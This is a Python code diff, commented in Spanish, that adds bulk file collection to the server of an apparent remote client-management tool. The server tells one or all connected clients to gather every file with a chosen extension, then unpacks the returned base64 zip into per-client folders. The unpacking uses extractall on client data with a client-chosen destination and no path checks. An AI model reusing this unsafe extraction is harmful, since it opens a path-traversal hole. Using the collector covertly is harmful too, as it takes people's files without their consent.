@@ -3,6 +3,8 @@ import base64
 from utils.logger import get_console
 from utils.validator import validate_path, validate_file_exists
 from config.settings import RECEIVED_FILES_DIR
+import zipfile
+import io
 
 class FileHandler:
     def __init__(self, client_manager):
@@ -78,6 +80,70 @@ class FileHandler:
             self.console.print(f"[bold red]Error al enviar archivo: {e}[/bold red]")
 
         return False
+
+    def enviar_comando_archivos_por_extension(self, ruta_busqueda, extension, ruta_destino=None, cliente_id=None):
+        """Envía un comando para solicitar archivos con cierta extensión desde el cliente."""
+        # Validaciones básicas
+        if not validate_path(ruta_busqueda):
+            self.console.print("[bold red]Error: La ruta de búsqueda no es válida.[/bold red]")
+            return False
+
+        if not extension.startswith(".") or len(extension) < 2:
+            self.console.print("[bold red]Error: La extensión debe comenzar con un punto (ej. .txt)[/bold red]")
+            return False
+
+        if not ruta_destino:
+            ruta_destino_final = os.path.normpath(RECEIVED_FILES_DIR)
+        else:
+            # Validar ruta_destino
+            if not validate_path(ruta_destino):
+                self.console.print("[bold red]Error: La ruta de destino no es válida.[/bold red]")
+                return False
+            
+            # Determinar si es ruta absoluta o relativa
+            if os.path.isabs(ruta_destino):
+                ruta_destino_final = os.path.normpath(ruta_destino)
+            else:
+                from config.settings import DATA_DIR
+                ruta_destino_final = os.path.normpath(os.path.join(DATA_DIR, ruta_destino))
+
+        # Construir el mensaje que el cliente entenderá
+        mensaje = {
+            "accion": "enviar_archivos_por_extension",
+            "extension": extension,
+            "ruta_directorio": ruta_busqueda,
+            "ruta_destino": ruta_destino_final
+        }
+
+        # Enviar a uno o a todos
+        return self._enviar_mensaje(mensaje, cliente_id)    
+
+    def _procesar_archivos_extension_enviados(self, datos_dict, cliente_id):
+        """Procesa archivos enviados por extensión."""
+        extension = datos_dict.get("extension")
+        cantidad_archivos = datos_dict.get("cantidad_archivos")
+        nombre_zip = datos_dict.get("nombre_zip")
+        ruta_destino = datos_dict.get("ruta_destino", RECEIVED_FILES_DIR)
+        datos_zip = datos_dict.get("datos_zip")
+        archivos_incluidos = datos_dict.get("archivos_incluidos", [])
+        
+        try:
+            carpeta_extraccion = os.path.join(ruta_destino, f"cliente_{cliente_id.replace('[Cliente ', '').replace(']', '')}_{extension.replace('.', '')}")
+            os.makedirs(carpeta_extraccion, exist_ok=True)
+            
+            with zipfile.ZipFile(io.BytesIO(base64.b64decode(datos_zip)), 'r') as zip_ref:
+                zip_ref.extractall(carpeta_extraccion)
+            
+            self.console.print(f"\n{cliente_id} [bold green]📁 Archivos por extensión procesados:[/bold green]")
+            self.console.print(f"{cliente_id} Extensión: {extension}")
+            self.console.print(f"{cliente_id} Cantidad de archivos: {cantidad_archivos}")
+            self.console.print(f"{cliente_id} Archivos extraídos en: {carpeta_extraccion}")
+            if len(archivos_incluidos) <= 10:
+                self.console.print(f"{cliente_id} Archivos incluidos: {', '.join(archivos_incluidos)}")
+            else:
+                self.console.print(f"{cliente_id} Archivos incluidos: {', '.join(archivos_incluidos[:10])}... y {len(archivos_incluidos)-10} más")
+        except Exception as e:
+            self.console.print(f"\n{cliente_id} [bold red]Error al procesar archivos por extensión:[/bold red] {str(e)}")
     
     def _procesar_archivo_enviado(self, datos_dict, cliente_id):
         """Procesa un archivo enviado por el cliente."""
